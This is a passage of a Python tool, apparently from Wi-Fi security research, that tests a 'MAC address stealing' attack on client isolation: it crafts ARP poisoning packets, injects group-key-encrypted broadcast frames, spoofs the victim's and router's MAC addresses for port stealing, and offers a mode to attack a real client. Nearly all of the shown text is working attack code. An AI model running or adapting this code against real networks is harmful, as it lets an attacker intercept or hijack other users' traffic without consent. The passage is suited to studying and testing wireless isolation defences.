			frame = header/LLC()/SNAP()/IP(src=self.sup_victim.routerip, dst=self.sup_victim.clientip)/ICMP()/Raw(b"icmp_ping_test")
			frame = encrypt_ccmp(frame, gtk, seq, keyid=idx)
			log(STATUS, "Injecting frame 5 times: " + repr(frame))
			# Inject multiple times because broadcast frames don't get acked/retransmitted
			for i in range(5):
				self.mon_attacker.inject_mon(frame)

		else:
			# Note: there are different forms of ARP poisoning. We only test for the basic variant,
			# which is the one most likely to be used/detected. Although scapy can automatically fill
			# in hwsrc, we do this explicitly ourselves.
			arp = ARP(op="is-at", psrc=self.sup_victim.routerip, pdst=self.sup_victim.clientip, \
					hwdst=self.sup_victim.mac, hwsrc=self.sup_attacker.mac)
			p = Ether(src=self.sup_attacker.mac, dst=self.sup_victim.mac)/arp
			log(STATUS, f"Sending Ethernet layer packet from attacker to victim: {repr(p)} (Ethernet destination is the victim)")
			self.sup_attacker.send_eth(p)
	
	def send_uplink_frame(self):
		if self.options.c2c_port_steal is not None:
			for _ in range(500000):
				ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
				p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"1234567890")
				#log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
				self.sup_victim.send_eth(p)
				time.sleep(0.02)
				# self.sup_victim.send_tcp_syn()

	def send_uplink_frame2(self):
		if self.options.c2c_port_steal_uplink is not None:
			ip = IP(src=self.sup_victim.clientip, dst="8.8.8.8")/ICMP(id=random.randint(0, 0xFFFF), seq=random.randint(0, 0xFFFF))
			p = Ether(src=self.sup_victim.mac, dst=self.sup_victim.routermac)/ip/Raw(b"abcdefghijklmn")
			log(STATUS, f"Sending ICMP echo packet from victim to 8.8.8.8:       {repr(p)}")
			for _ in range(500):
				self.sup_victim.send_eth(p)
				time.sleep(0.5)
			


	def start_monitor(self):
		# Let the 2nd client handle ARP requests and monitor for packets
		self.sup_victim.set_eth_handler(self.monitor_eth)
		self.sup_victim.event_loop()

	def start_attacker_receiver(self):
		self.sup_attacker.set_eth_handler(self.monitor_eth_port_steal)
		self.sup_attacker.event_loop()

	def start_attacker_receiver2(self):
		self.sup_attacker.set_eth_handler(self.monitor_eth_port_steal_uplink)
		self.sup_attacker.event_loop()

	def run(self):
		# If not in PoC mode, let victim client connect.
		if not self.options.poc:
			self.sup_victim.start()
			self.sup_victim.scan(wait=False)
			self.sup_victim.wait_scan_done()
			log(STATUS, f"Connecting as {self.sup_victim.id_victim} using {self.sup_victim.nic_iface} to the network...", color="green")
			self.sup_victim.connect(self.sup_victim.netid_victim, timeout=60)
			data = self.sup_victim.status()
			self.bssid_victim = data['bssid']
			# Let the victim get an IP address
			self.sup_victim.get_ip_address()

		if self.options.c2c_port_steal_uplink is not None:
			set_macaddress(self.options.c2c, self.sup_victim.routermac)
			self.sup_attacker = Supplicant(self.options.c2c, self.options)

		self.attacker_connect()

		self.check_gtk_shared()

		# [ Send a packet from the attacker to the victim ]

		thread1 = threading.Thread(target=self.send_c2c_frame)
		if not self.options.poc:
			thread2 = threading.Thread(target=self.start_monitor)

		if self.options.c2c_port_steal is not None:
			thread4 = threading.Thread(target=self.start_attacker_receiver)
		elif self.options.c2c_port_steal_uplink is not None:
			thread4 = threading.Thread(target=self.start_attacker_receiver2)
			

		if not self.options.poc:
			if self.options.c2c_port_steal is not None:
				thread3 = threading.Thread(target=self.send_uplink_frame)
			elif self.options.c2c_port_steal_uplink is not None:
				thread3 = threading.Thread(target=self.send_uplink_frame2)
				
		if not self.options.poc:
			thread2.start()
		thread1.start()
		if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
			thread4.start()
			
		if not self.options.poc:
			if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
				thread3.start()


		thread1.join()
		if not self.options.poc:
			thread2.join()
		thread4.join()
		if not self.options.poc:
			if self.options.c2c_port_steal is not None or self.options.c2c_port_steal_uplink is not None:
				thread3.join()


		# Identity output to use
		identities = f"{self.sup_attacker.id_attacker} to {self.sup_attacker.id_victim}"
		if self.options.same_id:
			identities = f"{self.sup_victim.id_victim} to {self.sup_victim.id_victim}"

		# Layer output to use
		
		if self.options.c2c_ip is not None:
			layer = "IP"
		elif self.options.c2c_eth is not None:
			layer = "Ethernet"
		else:
			layer = "Ethernet (ARP poisoning)"

		if not self.forward_ethernet and self.options.c2c_eth is not None:
			log(STATUS, f">>> Client to client traffic at Ethernet layer appears to be disabled ({identities}).", color="green")
		elif not self.forward_ip and self.options.c2c_ip is not None:
			log(STATUS, f">>> Client to client traffic at IP layer appears to be disabled ({identities}).", color="green")

	def attacker_connect(self):
                self.sup_attacker.start()
                self.sup_attacker.scan(wait=False)
                self.sup_attacker.wait_scan_done()

                # If --other-bss is connect, connect to a different BSSID. Otherwise connect to the same BSSID.
                #if self.options.other_bss:
                #        log(STATUS, f"Will now connect to a BSSID different than {self.bssid_victim}")
                #        self.sup_attacker.ignore_bssid(self.bssid_victim)
                #else:
                #        log(STATUS, f"Will now connect to the BSSID {self.bssid_victim}")
                #        self.sup_attacker.set_bssid(self.bssid_victim)

                if self.options.same_id:
                        log(STATUS, f"Connecting as {self.sup_attacker.id_victim} using {self.sup_attacker.nic_iface} to the network...", color="green")
                        self.sup_attacker.connect(self.sup_attacker.netid_victim, timeout=60)
                else:
                        log(STATUS, f"Connecting as {self.sup_attacker.id_attacker} using {self.sup_attacker.nic_iface} to the network...", color="green")
                        self.sup_attacker.connect(self.sup_attacker.netid_attacker, timeout=60)

                data = self.sup_attacker.status()
                self.bssid_attacker = data['bssid']
                
                # Let the attacker get an IP address, also
                if self.options.c2c_port_steal_uplink is None and self.options.c2c_port_steal is None:
                        self.sup_attacker.get_ip_address()
                elif self.options.c2c_port_steal is not None: 
                        self.sup_attacker.arp_sock = ARP_sock(sock=self.sup_attacker.sock_eth, IP_addr=self.sup_victim.clientip, ARP_addr=self.sup_attacker.mac)
                        self.sup_attacker.can_send_traffic = True
                self.attacker_connected = True

	def check_gtk_shared(self):
                if self.options.check_gtk_shared is not None:
                        victim_gtk = self.sup_victim.get_gtk()
                        attacker_gtk = self.sup_attacker.get_gtk()
                        log(STATUS, f">>> The victim's GTK is ({victim_gtk}).", color="green")
                        log(STATUS, f">>> The attacker's GTK is ({attacker_gtk}).", color="green")
                        return


class Client2Monitor:
	def __init__(self, options):
		self.monitor = Monitor(options.c2m, options)
		self.sup_attacker = Supplicant(options.iface, options)
		self.options = options

	def stop(self):
		# self.sup_victim.stop()
		self.monitor.stop()
		self.sup_attacker.stop()

	def send_c2m_frame(self):
		if self.options.c2m_ip is not None:
			knock_three_times()

	def knock_three_times(self):
		ip = IP(src=self.sup_attacker.clientip, dst="172.16.0.4")/UDP(sport=53, dport=53)
		p1 = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b'\x00' * 66)
		p2 = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b'\x00' * 88)
		p3 = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b'\x00' * 101)
		log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p1)} (Ethernet destination is the gateway/router)")
		log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p2)} (Ethernet destination is the gateway/router)")
		log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p3)} (Ethernet destination is the gateway/router)")
		self.sup_attacker.send_eth(p1)
		time.sleep(0.2)
		self.sup_attacker.send_eth(p2)
		time.sleep(0.5)
		self.sup_attacker.send_eth(p3)
		time.sleep(0.7)

	def start_monitor(self):
		log(STATUS, "Starting Monitor!")
		self.monitor.event_loop(timeout=5)

	def run(self):
		# Start both clients
		self.monitor.start()
		self.sup_attacker.start()
		# self.sup_victim.scan(wait=False)
		self.sup_attacker.scan(wait=False)
		# self.sup_victim.wait_scan_done()
		self.sup_attacker.wait_scan_done()

		# Let both client connects
		log(STATUS, f"Connecting as {self.sup_attacker.id_attacker} using {self.sup_attacker.nic_iface} to the network...", color="green")
		self.sup_attacker.connect(self.sup_attacker.netid_attacker, timeout=60)
		data = self.sup_attacker.status()
		bssid = data['bssid']

		# Let both clients get an IP address
		# self.sup_victim.get_ip_address()
		self.sup_attacker.get_ip_address()

		#self.monitor.event_loop(timeout=5)
		thread1 = threading.Thread(target=self.knock_three_times)
		
		thread2 = threading.Thread(target=self.start_monitor)

		thread2.start()
		thread1.start()

		thread1.join()
		thread2.join()

def cleanup():
	test.stop()


def main():
	global test

	parser = argparse.ArgumentParser(description="Security Context Override ('MAC address stealing') attack test")
	parser.add_argument("iface", help="Wireless interface to use.")
	parser.add_argument("--config", default="client.conf", help="Config containing victim and attacker credentials.")
	parser.add_argument("--server", default="8.8.8.8", help="Server to send TCP SYN to.")
	parser.add_argument("--ping", default=False, action="store_true", help="Perform ping to test connection.")
	parser.add_argument("--delay", default=0, type=float, help="Time to wait before reconnecting as attacker.")
	parser.add_argument("-d", "--debug", action="count", default=0, help="Increase output verbosity.")
	parser.add_argument("--other-bss", default=False, action="store_true", help="User different BSS=AP for victim/attacker.")
	parser.add_argument("--no-ssid-check", default=False, action="store_true", help="Allow victim and attacker to use different SSIDs.")
	parser.add_argument("--same-id", default=False, action="store_true", help="Reconnect under the victim identity.")
	parser.add_argument("--flip-id", default=False, action="store_true", help="Flip the victim/attacker identities.")
	parser.add_argument("--no-id-check", default=False, action="store_true", help="Allow attack test with same victim/attacker identity.")
	parser.add_argument("--c2c", help="Second interface to test client-to-client Ethernet ARP poisoning traffic.")
	parser.add_argument("--c2c-eth", help="Second interface to test client-to-client Ethernet traffic.")
	parser.add_argument("--c2c-ip", help="Second interface to test client-to-client IP layer traffic.")
	parser.add_argument("--c2c-broadcast", help="Second interface to test client-to-client Ethernet layer broadcast traffic.")
	parser.add_argument("--c2m", help="Second interface to test client-to-monitor traffic.")
	parser.add_argument("--c2m-ip", help="Second interface to test client-to-monitor IP layer traffic, by setting it to monitor mode")
	parser.add_argument("--c2m-mon-channel", type=int, help="The monitored channel for that c2m's second interface")
	parser.add_argument("--c2m-mon-output", help="c2m's second interface's monitoring output filename")
	parser.add_argument("--c2c-port-steal", help="Second interface to test port stealing.")
	parser.add_argument("--c2c-port-steal-uplink", help="Second interface to test port stealing (uplink).")
	parser.add_argument("--fast", help="Fast override attack using second given interface.")
	parser.add_argument("--check-gtk-shared", help="Checking if second given interface receives the same GTK from BSSID.")
	parser.add_argument("--poc", default=False, action="store_true", help="Attack a real client for PoC purposes.")
	parser.add_argument("--c2c-gtk-inject", help="Checking if second given interface can inject frames wrapped with GTK.")
	options = parser.parse_args()

	# TODO: Implement this by first connecting to the given BSSID to create a cached PMK
	if options.fast is not None:
		log(ERROR, "The fast override attack is not yet supported by this script.")
		quit(1)

	if options.ping and (options.other_bss or options.same_id or options.c2c or options.fast):
		log(ERROR, "The ping options cannot be combined with other-bss, same-id, c2c, or fast parameters.")
		quit(1)

	if options.no_ssid_check and not options.other_bss:
		log(WARNING, f"WARNING: When using --no-ssid-check you usually also want to use --other-bss")

	# Assure that options.c2c is always set when doing client-to-client tests
	if options.c2c_eth is not None: options.c2c = options.c2c_eth
	if options.c2c_ip is not None: options.c2c = options.c2c_ip
	if options.check_gtk_shared is not None: options.c2c = options.check_gtk_shared
	if options.c2c_port_steal is not None: options.c2c = options.c2c_port_steal
	if options.c2c_port_steal_uplink is not None: options.c2c = options.c2c_port_steal_uplink
	if options.c2c_gtk_inject is not None: options.c2c = options.c2c_gtk_inject
	if options.c2c_broadcast is not None: options.c2c = options.c2c_broadcast

	if options.c2m_ip is not None: options.c2m = options.c2m_ip

	options.port = 443
	if ":" in options.server:
		options.server, options.port = options.server.split(":")
		options.port = int(options.port)

	change_log_level(-options.debug)

	if options.c2m:
		test = Client2Monitor(options)
	elif not options.c2c:
		test = Supplicant(options.iface, options)
	else:
		test = Client2Client(options)
	atexit.register(cleanup)
	test.run()


if __name__ == "__main__":
	main()



